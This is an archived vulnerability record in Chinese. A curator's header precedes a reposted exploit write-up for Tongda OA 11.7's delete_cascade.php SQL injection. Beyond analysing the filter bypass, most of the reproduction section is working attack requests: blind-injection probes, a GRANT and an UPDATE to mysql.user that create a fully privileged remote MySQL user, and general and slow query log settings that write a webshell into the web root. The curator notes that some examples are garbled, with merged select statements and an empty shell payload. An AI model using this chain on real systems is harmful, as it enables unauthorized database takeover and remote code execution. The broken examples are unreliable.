---
source: "MrWQ/vulnerability-paper"
title: "通达OA delete_cascade.php后台任意SQL→数据库提权/日志写入链"
product: "通达OA"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "TD OA11.7；MySQL高权限、远程端口可达、日志写Web目录"
prerequisites: "明确需登录"
side_effects: "现有材料未完整列明副作用；示例不保证只读或无状态变化"
review_date: "2026-10-02"
source_url: "https://mp.weixin.qq.com/s/U34PNTUx1CXu80TZmmTwSQ"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/OA%E5%8A%9E%E5%85%AC/%E6%B3%9B%E5%BE%AEoa/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%20XX%20OA11.7%20SQL%20%E6%B3%A8%E5%85%A5%202%20Getshell%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0.md"
category_recommendation: "OA / 通达"
id: "vw-7ee05b65051eebd6794ca324"
entity_id: "ve-7ee05b65051eebd6794ca324"
schema_version: "1"
---

# 通达OA delete_cascade.php后台任意SQL→数据库提权/日志写入链

## 条目说明

- 对象与具体问题：通达OA；delete_cascade.php后台任意SQL→数据库提权/日志写入链
- 版本、配置及部署条件：TD OA11.7；MySQL高权限、远程端口可达、日志写Web目录
- 认证与权限前提：明确需登录
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 细致SQL过滤/错误真假对照与高权限条件有价值，与通达delete_cascade专题互补
- 示例select if两句粘连，日志写shell的select正文变成空字符串，核心PHP内容丢失
- 新建远程数据库账号、改权限、开日志和写文件有显著副作用，不能标安全检测；缺精确补丁/原始源码文本

## 操作风险

现有材料未完整列明副作用；示例不保证只读或无状态变化。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。

## 技术资料与来源记录

> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/U34PNTUx1CXu80TZmmTwSQ)

一、漏洞简介：

delete_cascade.php 文件中存在盲注，可执行任意 sql 语句，由于数据库用户一般权限较高，所以导致可通过注入点高权限数据库用户，去添加一个用于远程连接 mysql 的用户，再给此新用户添加对应的权限后，利用日志文件 getshell

影响版本：

TD OA v11.7 版本

限制条件：

需要账号进行登录

二、漏洞分析：

注入漏洞在：/general/hr/manage/query/delete_cascade.php 文件中

此文件是需要登录后才能访问的，首先判断变量 $condition_cascade 是否为空，然后将 \'替换为'后赋值给 $query 变量，然后直接带入 exequery() 函数中执行，而变量 $condition_cascade 通过程序本身的变量覆盖漏洞进行赋值即可

![](../../.resource/remote/ec774840c24a61f75043a0d4a1039232041de08df72fe5a97367c023d6d9dd4c.png)

跟进 exequery() 函数：/inc/conn/php 36-45 行

![](../../.resource/remote/65a6e1386f463a125937cdf0fc570502c0a8cb05072cd5b6ef6714e0fc234d50.png)

如果执行错误会调用 PrintError() 函数进行错误信息输出

![](../../.resource/remote/a5d7e085645c1400db9f0aa25af372182574f8215fb40dbf13dae2cf138a7c6c.png)

然后又调用 db_query() 函数：/inc/conn/php 47-70 行

首先对传入的 $Q 进行字符串替换，然后带入 sql_injection() 函数执行，最后直接调用原生的 mysql_query() 函数对 sql 语句进行执行

![](../../.resource/remote/d95b4f5b0dc6a12df1b2166ff218ee948e08aae28192ae16bd2df1efcee7aa53.png)

继续跟进 sql_injection() 函数：/inc/conn/php 110-187 行

首先还是对传入的参数进行一些字符串的替换，以及正则匹配替换，这些影响不大，我们接着往后看

![](../../.resource/remote/85a5b88923963827dd580f2815c94126a6340822042e005b6c8e7eda1bb9e7c7.png)

153 行开始，通过一系列的正则匹配，对传入的 sql 语句进行判断并过滤，一些报错注入使用的函数、联合查询函数、以及写文件的函数等等都进行了黑名单过滤，如果满足任意一个 if 判断就会将 $fail 设为 true，但是 if、substr 等函数并没有过滤掉，所以还是可以进行盲注判断的

![](../../.resource/remote/f350b7afd4945ec300235f0b725b7807aeb439e5a6317c7e2d2615f08b88e9c1.png)

如果触发了过滤代码，就会执行以下代码，并 exit 退出程序

![](../../.resource/remote/1a4e5a216afa6766c5ba8b83ecc432aa8d9d832a8278620728f54b25f665aebd.png)

还可以利用 mysql 中的冷门函数，使 sql 语句执行时就会报错，从而使程序调用 **PrintError()** 函数进行报错信息的输出，而执行成功会输出下面的信息，通过两次执行语句返回的信息不同判断注入是否存在

![](../../.resource/remote/9eb600987d537cde7223d438db428313b80c49567d5f526dc470fd748fbf6246.png)

例如：

```
select if(0,power(9999,99),2)select if(1,power(9999,99),2)
```

如果条件为 TRUE 则执行 power(9999,99)，如果条件为 FALSE 则返回 2，而 power() 函数是返回 9999 的 99 次方，当执行会报如下错误：

![](../../.resource/remote/2e68aae58e9a661d98ac916fea3c7ec642a9d480c4b2e140b0ba98fa9406b2e0.png)

当成功判断注入存在后，因为漏洞点是可以执行任意 sql 语句的，所以我们可以通过程序本身 mysql 用户权限高的先决条件进行深入的利用

三、漏洞复现：

1、判断注入是否存在：

```
http://192.168.136.148:8081/general/hr/manage/query/delete_cascade.php?condition_cascade=select if(0,power(9999,99),2);
```

执行成功会返回如下信息：  

![](../../.resource/remote/970e10d28509478100582c763df321ed7ccdfeff5386b00082f962ad9dbabde3.png)

```
http://192.168.136.148:8081/general/hr/manage/query/delete_cascade.php?condition_cascade=select if(1,power(9999,99),2);
```

执行报错则返回：  

![](../../.resource/remote/2a4dce6d563a2c27d3bd8f5e6d1cf62011d9bfaee0b7906a7ec52a24a15bfee4.png)

根据两次执行返回结果的不同，可以判断注入存在

2、添加用户远程连接 mysql：

```
http://192.168.136.148:8081/general/hr/manage/query/delete_cascade.php?condition_cascade=grant all privileges ON mysql.* TO 'test111'@'%' IDENTIFIED BY 'test111@123' WITH GRANT OPTION
```

![](../../.resource/remote/e5cd659d7a9300eef6ba4f6590c05ecbcd93c6cf9f9e8fb9dcfcdc402112630a.png)

然后利用添加的用户 test111 远程连接 mysql，注意默认端口为 3336

![](../../.resource/remote/6a9f6622671576761490c9370d612398418d14aae54c13af5c5dfd2c4ec73460.png)

给新添加的 test111 用户添加对应的权限：

```
UPDATE `mysql`.`user` SET `Password` = '*5ADFDA524177A8EB24D7671EF80A46F95C68D4ED', `Select_priv` = 'Y', `Insert_priv` = 'Y', `Update_priv` = 'Y', `Delete_priv` = 'Y', `Create_priv` = 'Y', `Drop_priv` = 'Y', `Reload_priv` = 'Y', `Shutdown_priv` = 'Y', `Process_priv` = 'Y', `File_priv` = 'Y', `Grant_priv` = 'Y', `References_priv` = 'Y', `Index_priv` = 'Y', `Alter_priv` = 'Y', `Show_db_priv` = 'Y', `Super_priv` = 'Y', `Create_tmp_table_priv` = 'Y', `Lock_tables_priv` = 'Y', `Execute_priv` = 'Y', `Repl_slave_priv` = 'Y', `Repl_client_priv` = 'Y', `Create_view_priv` = 'Y', `Show_view_priv` = 'Y', `Create_routine_priv` = 'Y', `Alter_routine_priv` = 'Y', `Create_user_priv` = 'Y', `Event_priv` = 'Y', `Trigger_priv` = 'Y', `Create_tablespace_priv` = 'Y', `ssl_type` = '', `ssl_cipher` = '', `x509_issuer` = '', `x509_subject` = '', `max_questions` = 0, `max_updates` = 0, `max_connections` = 0, `max_user_connections` = 0, `plugin` = 'mysql_native_password', `authentication_string` = '', `password_expired` = 'Y' WHERE `Host` = Cast('%' AS Binary(1)) AND `User` = Cast('test111' AS Binary(7));
```

如果需要改用户名和密码的话需要对相应字段进行更改，Binary(7) 中的数值根据字符串长度更改  

![](../../.resource/remote/ac1e82ed098bebc8217fe71c261d0095d552a4f030284918077b9bdac340d67a.png)

3、用注入点刷新权限，因为新添加的用户是没有权限进行刷新的：

```
http://192.168.136.148:8081/general/hr/manage/query/delete_cascade.php?condition_cascade=flush privileges
```

![](../../.resource/remote/1c1b3261f327b38dc0b8d942c02c1bf5da432850abd35a0ceb8af4f83adaa262.png)

执行完之后会提示：

![](../../.resource/remote/43f3469360fcab2eab276efa7669003890e18ed3d92e9259de1811ae8a852888.png)

重新执行一下添加用户的命令即可：

```
http://192.168.136.148:8081/general/hr/manage/query/delete_cascade.php?condition_cascade=grant all privileges ON mysql.* TO 'test111'@'%' IDENTIFIED BY 'test111@123' WITH GRANT OPTION
```

![](../../.resource/remote/e5cd659d7a9300eef6ba4f6590c05ecbcd93c6cf9f9e8fb9dcfcdc402112630a.png)

4、通过日志写 shell：

查询 mysql 安装路径

```
select @@basedir
```

![](../../.resource/remote/805a1be37a9f1636752af3a119f9e5a59e5eea3bf5f02040cd9a90b8690b8f21.png)

那么可以得出 web 根目录为：

D:/MYOA/webroot

①通过全局日志写 shell：

```
set global general_log = on;
set global general_log_file = 'D:/MYOA/webroot/_inc.php';
select '';
show variables like '%general%';
```

![](../../.resource/remote/9fd74c7e583c0a2c1e3ef8f5e4322eee1c42080eb83d86776cab298067e84d36.png)

连接 webshell：

![](../../.resource/remote/5df1741d94deaa3f883e65c9b8511b5be356d6b58fa3e543d21b16fc2d80040c.png)

②通过慢查询日志写 shell，步骤类似：

```
set global slow_query_log=on;
set global slow_query_log_file='D:/MYOA/webroot/_inc.php';
select '' or sleep(11);
```

**文笔浅显，如有错误欢迎各位师傅们交流提出**

  

**☆ END ☆**

**点个赞和在看吧，欢迎转发！**

![](../../.resource/remote/8ba6e8f17ebea2ffea9a9926b2e34dc16504fced334a973803836f728906eed0.gif)

---

> 来源：MrWQ/vulnerability-paper（https://github.com/MrWQ/vulnerability-paper）
